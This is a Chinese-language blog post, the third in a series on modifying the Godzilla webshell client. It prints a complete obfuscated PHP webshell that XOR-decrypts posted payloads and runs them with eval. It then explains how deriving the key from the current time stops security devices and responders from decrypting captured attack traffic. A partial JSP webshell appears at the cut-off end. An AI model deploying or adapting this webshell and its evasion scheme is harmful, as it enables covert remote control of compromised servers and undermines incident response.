<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>哥斯拉二开从0到1-3(动态密钥) | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言有小伙伴说，上面的文章都做了动态的免杀，每次生成的木马都不一样，还挺好的，还有没有什么东西可以做成动态的，我想了想，如果把我们的密钥做成动态的，那岂不是，简单的实现了动态加密。 前置知识首先我们来看，哥斯拉的加密传输过程  这里我们可以看到，有两个关键点，就是 ..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-3Z9EQ7RWNS')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '哥斯拉二开从0到1-3(动态密钥)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/哥斯拉二开从0到1/image-20241114102655833.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">哥斯拉二开从0到1-3(动态密钥)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">哥斯拉二开从0到1-3(动态密钥)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-13T08:24:51.030Z" title="更新于 2025-01-13 16:24:51">2025-01-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,952</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴说，上面的文章都做了动态的免杀，每次生成的木马都不一样，还挺好的，还有没有什么东西可以做成动态的，我想了想，如果把我们的密钥做成动态的，那岂不是，简单的实现了动态加密。</p>
<h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p>首先我们来看，哥斯拉的加密传输过程</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20241224145346679.png" alt="image-20241224145346679"></p>
<p>这里我们可以看到，有两个关键点，就是  pass和key</p>
<p>pass就是传递的键，payload为值，payload是由key控制的，因为你每次需要发送的东西  都会进行异或一下。如果这里，我们把key设成动态的，那么也就是说，payload就会是动态的。当然，这不是重点，重点是，如果对方的安全设备上，捕获了我们的流量，他想解密我们在其中做了什么，那么就需要key解密，看图中的第八步，执行的结果需要xor才能获取值。好，如果我们的木马文件中，没有写key，或者把key写成动态的，如果他不知道key是什么，那么他就解不出来了我们做了什么了。当然，key是可以爆破的，就是比较麻烦了。</p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>这里我们也可以想到，因为我们必须要传上去一个木马，木马中必定带key和pass，并且本地也需要知道这个key，去和服务端通信。如果客户端发送一个key  再在木马中使用，那么流量中就会暴漏key了。那么，目前来看最好的协商密钥就是时间，我们的哥斯拉肯定是运行在本地的，那么时间肯定是准的，假设，服务器时间也是准的，那么，我们每次执行都需要key，那么也就是说key在变化，我们的payload也在变化。如果运维人员需要解密，那么，将需要更多的时间。</p>
<p>我们在假设一个场景，理想化一点当然如果服务器的时间和本地时间是准的，而安全设备的时间和服务器的时间不同步，那么他可能就解不出来我们的流量了，也就是不知道我们具体做了什么了。思路有了，下面来具体实现。</p>
<h5 id="php-实现动态密钥"><a href="#php-实现动态密钥" class="headerlink" title="php 实现动态密钥"></a>php 实现动态密钥</h5><p>直接在我们免杀的基础上改一下，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?pHP</span></span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>,chr(<span class="number">48</span>));</span><br><span class="line">header(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">call_user_func(nsfocus(<span class="string">&quot;c2V0X3RpbWVfbGltaXQ=&quot;</span>), <span class="number">48</span>);</span><br><span class="line"><span class="variable">$asiainfosec</span> = Chr(<span class="number">98</span>).Chr(<span class="number">97</span>).Chr(<span class="number">115</span>).Chr(<span class="number">101</span>).Chr(<span class="number">54</span>).Chr(<span class="number">52</span>).Chr(<span class="number">95</span>);</span><br><span class="line"><span class="variable">$huawei</span> = <span class="string">&quot;\x63\x6f\x64\x65&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hillstonenet</span>(<span class="params"><span class="comment">/*antiy*/</span><span class="variable">$chaitin</span>,<span class="variable">$topsec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$damddos</span>=Chr(<span class="string">&quot;48&quot;</span>);<span class="variable">$damddos</span>&lt;strlen(<span class="variable">$chaitin</span>);<span class="variable">$damddos</span>++) &#123;</span><br><span class="line">        <span class="variable">$dbappsecurity</span> = <span class="variable">$topsec</span>[<span class="variable">$damddos</span>+Chr(<span class="string">&quot;49&quot;</span>)&amp;chr(<span class="number">49</span>).chr(<span class="number">53</span>)];</span><br><span class="line">        <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>] = <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>]^<span class="variable">$dbappsecurity</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$chaitin</span>;</span><br><span class="line">&#125;<span class="variable">$sangfor</span>=nsfocus(<span class="string">&quot;cGFzcw==&quot;</span>);<span class="variable">$threatbook</span> = nsfocus(<span class="string">&quot;WVhsc2IyRms=&quot;</span>);</span><br><span class="line"><span class="variable">$qianxin</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">101</span>).Chr(<span class="number">110</span>).<span class="variable">$huawei</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nsfocus</span>(<span class="params"><span class="variable">$strshiwu</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$asiainfosec</span>,<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">100</span>).Chr(<span class="number">101</span>).<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="variable">$func</span>, <span class="variable">$strshiwu</span>);</span><br><span class="line">&#125;<span class="variable">$qingteng</span>=nsfocus(<span class="string">&quot;M2M2ZTBiOGE5YzE1MjI0YQ==&quot;</span>);</span><br><span class="line"><span class="variable">$venustech</span> = nsfocus(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span><span class="comment">/*qingteng*/</span>[<span class="variable">$sangfor</span>])) &#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    <span class="variable">$alibaba</span>=hillstonenet<span class="comment">/*antiy*/</span>(nsfocus(<span class="variable">$_POST</span>[<span class="variable">$sangfor</span>]),<span class="variable">$qingteng</span>);<span class="keyword">if</span> (<span class="comment">/*antiy*/</span><span class="keyword">isset</span>(<span class="variable">$_SESSION</span><span class="comment">/*leadsec*/</span>[<span class="variable">$dptech</span>])) &#123;</span><br><span class="line"><span class="variable">$antiy</span>=hillstonenet(<span class="variable">$_SESSION</span><span class="comment">/*hillstonenet*/</span>[<span class="variable">$dptech</span>],<span class="variable">$qingteng</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="comment">/*antiy*/</span>strpos(<span class="variable">$antiy</span>,nsfocus<span class="comment">/*antiy*/</span>(<span class="variable">$venustech</span>))===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$antiy</span>=hillstonenet<span class="comment">/*antiy*/</span>(<span class="variable">$antiy</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">&#125;define(<span class="string">&quot;leadsec&quot;</span>,<span class="string">&quot;//alibaba\r\n&quot;</span>.<span class="variable">$antiy</span>);@<span class="keyword">eval</span>(leadsec);<span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>.<span class="variable">$qianxin</span>(hillstonenet(@run(<span class="variable">$alibaba</span>),<span class="variable">$qingteng</span>)).<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">if</span> (strpos<span class="comment">/*nsfocus*/</span>(<span class="variable">$alibaba</span>,nsfocus(<span class="variable">$venustech</span>))!==<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$dptech</span>]=hillstonenet(<span class="variable">$alibaba</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$qingteng=nsfocus(“M2M2ZTBiOGE5YzE1MjI0YQ==”);  为key的base64,</p>
<p>先看下时间</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110658577.png" alt="image-20250106110658577"></p>
<p>php很简单就能获取到，在取该时间的md5的前16位</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110937329.png" alt="image-20250106110937329"></p>
<p>可以看到也可以取到，那么，给到我们定义的key即可。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111038800.png" alt="image-20250106111038800"></p>
<p>也就是这样。</p>
<p>好，木马做好之后，就是客户端了。我们修改一下客户端。</p>
<p>到连接的代码中改一下，和php的一样，要严格一样，不然md5不对，肯定是连不上的，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111257535.png" alt="image-20250106111257535"></p>
<p>先获取时间，在md5 在取前十六位，在复制给key就可以了。</p>
<p>看下木马的key，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111506618.png" alt="image-20250106111506618"></p>
<p>简单随机，不固定</p>
<p>打包编译即可。</p>
<p>来测试一下。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111624123.png" alt="image-20250106111624123"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111737530.png" alt="image-20250106111737530"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111750915.png" alt="image-20250106111750915"></p>
<p>功能都没有问题。</p>
<p>好，现在来说一下缺点，没说之前，我们还是要仔细的来了解一下哥斯拉的传递参数原理。</p>
<p>在</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112822066.png" alt="image-20250106112822066"></p>
<p>这个界面，我们点击测试的时候，哥斯拉会传递一个大包，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112904595.png" alt="image-20250106112904595"></p>
<p>也就是这个，他会很大，且发送包不携带cookie。服务器端会生成一个PHPSESSID的值，来存储请求的大包，这个请求的大包是什么呢，我们可以解出来看一下。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106144059303.png" alt="image-20250106144059303"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> gzdecode(encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>);</span><br></pre></td></tr></table></figure>

<p>代码太长了，简单说一下，就是各种功能的一些函数，如文件读取，创建，命令执行等等很多。</p>
<p>也就是说，哥斯拉会把所有的功能储存到一个session中，后面执行命令的时候，直接调用函数，在进行传参就可以了。然后close掉。</p>
<p>这是点击测试的流程。</p>
<p>下面是执行命令的流程。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145104840.png" alt="image-20250106145104840"></p>
<p>当我们点击进入后，会有三个包</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145426293.png" alt="image-20250106145426293"></p>
<p>第一个就是特别长的包，包含所有功能，存储到一个session中</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145741094.png" alt="image-20250106145741094"></p>
<p>然后就是发送测试包，没有问题的话，就是发送getBasicsInfo包获取基本信息了。</p>
<p>这里就是有一个问题，假设我们在<code>06 January 2025 15:00</code>点击进入页面，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106150249553.png" alt="image-20250106150249553"></p>
<p>那么，当我们点击进入页面后，就会使用<code>06 January 2025 15:00</code>的key去异或所有的功能的那个包然后存储到sessionid中，那么问题来了，当时间为<code>06 January 2025 15:01</code> 时，key就会变化，也就是说木马变了。而调用sessionid中的功能的key变化了，所以进入的这个页面就不能用了。</p>
<p>那么我们就可以遇到一个问题，不能实时的动态key了。退而求其次，笔者这里采用十分钟一次和60分钟一次。</p>
<p>10min:我们将key设为<code>06 January 2025 15:0</code>时，那么这个终端就可以使用十分。有同学问了，如果是15：09连上的，能用几分钟，显然，能用一分钟，下一分钟时间变成了<code>06 January 2025 15:1</code>，就不能用了。</p>
<p>60min:我们将key设为<code>06 January 2025 15</code>时，那么这个终端就可以使用十分。有同学问了，如果是15：50连上的，能用几分钟，显然，能用10分钟，下10分钟时间变成了<code>06 January 2025 16</code>，就不能用了。</p>
<p>好，如果不能用了后，怎么再次使用，其实很简单，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154650833.png" alt="image-20250106154650833"></p>
<p>这个页面，关与不关都无所谓，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154746122.png" alt="image-20250106154746122"></p>
<p>只需从新点击进入即可，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154815100.png" alt="image-20250106154815100"></p>
<p>接着用。如果大家渗透测试的时候，如果打开了一个文件，或者扫描了什么，都不影响，只要不关掉即可。关掉了也没事，就是在想截图的时候，就截不到了。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154853081.png" alt="image-20250106154853081"></p>
<p>tips:当执行命令，执行完后，返回null或者啥也不返回，先看时间或者从新进入一次，再怀疑是不是被应急了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106155133587.png" alt="image-20250106155133587"></p>
<p>怕影响同学们的使用体验，十分钟就要退出一次，可能有点频繁，所以笔者这里也做了60min的过期时间，当然如果，恰巧在12：59分的话，也没有办法，那就从新点进入一下吧。</p>
<p>有小伙伴可能有疑惑，能不能再长一点时间，其实我是不建议的，为什么呢？假设我们设置了个一天的，那确实不用一直退出了，但是key就不变化了，那么也就是说，跟原来的不动态key加密没有什么区别了，设成一天，还不如直接用定死的key，所以这里没有定义一天的。我们做动态key的初衷就是让运维人员不好解密我们的流量或者解密流量难一些，定义一天流量解密变得简单了，所以暂时先不做吧。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106170342545.png" alt="image-20250106170342545"></p>
<p>当然，当你使用动态key的木马后，就不能使用自己的key了，在连接时输入的key也不起作用了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250107102102047.png" alt="image-20250107102102047"></p>
<p>大家记得，用的时候先去生成哦。</p>
<p>还有一个小事，因为我们动态key的木马连接的时候不需要输入key了，相应的，别人有密码就可以连接你的木马，所以我们使用的时候，尽量把密码设置的复杂一些，自己辛辛苦苦打的成果别让人家上了车。</p>
<p>这里就不写代码过程了，大家直接下载就好了。</p>
<h5 id="jsp-实现动态密钥（暂未实现）"><a href="#jsp-实现动态密钥（暂未实现）" class="headerlink" title="jsp 实现动态密钥（暂未实现）"></a>jsp 实现动态密钥（暂未实现）</h5><p>由于笔者能力太菜，jsp的暂未实现。</p>
<p>为什么没能实现呢，大概就是，木马在声明标签&lt;%! %&gt;中定义了key，但是当我们把时间定义为key后，key是不变化的。当这个文件被创建时，就定死了。所以达不到动态的。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105239865.png" alt="image-20250109105239865"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105251342.png" alt="image-20250109105251342"></p>
<p>无论怎么刷新，都不能改变上面的时间了。只有在&lt;%! %&gt;中定义才可以。但是aes解密又解不了了。暂时还没研究明白，先搁置把。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="class"><span class="keyword">class</span> 